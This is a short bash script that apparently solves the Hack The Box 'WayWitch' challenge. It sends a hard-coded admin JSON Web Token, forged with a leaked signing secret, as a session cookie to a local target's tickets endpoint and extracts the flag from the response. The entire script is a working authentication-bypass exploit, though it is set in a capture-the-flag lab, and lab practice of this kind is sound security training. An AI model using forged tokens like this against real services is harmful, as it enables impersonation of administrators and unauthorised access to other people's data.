#!/bin/bash
# https://app.hackthebox.com/challenges/WayWitch
# Tags: JWT, leaked secret key

TARGET="127.0.0.1:1337"
ADMIN_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.cZWxa1K7QYrrER18LTTA6BFtEt79_e_zcK4TIVdFNH8"
FLAG=$(curl -s --insecure https://$TARGET/tickets -H "Cookie: session_token=$ADMIN_JWT" | grep -oP 'HTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
